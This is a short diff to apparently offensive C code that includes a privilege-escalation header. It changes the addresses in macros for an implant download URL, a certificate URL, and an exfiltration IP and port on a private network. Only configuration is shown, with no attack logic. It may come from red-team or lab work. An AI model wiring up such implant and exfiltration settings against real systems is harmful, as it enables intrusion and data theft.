@@ -29,13 +29,13 @@
 #include "privesc.h"
 
 #ifndef URL
-#define URL "http://10.37.1.249/implant"
+#define URL "http://10.37.1.149/implant"
 #endif
 #ifndef CERT_URL
-#define CERT_URL "http://10.37.1.249/cert.pem"
+#define CERT_URL "http://10.37.1.149/cert.pem"
 #endif
 #ifndef EXFIL_IP
-#define EXFIL_IP "10.37.1.249"
+#define EXFIL_IP "10.37.1.149"
 #endif
 #ifndef EXFIL_PORT
 #define EXFIL_PORT 8889
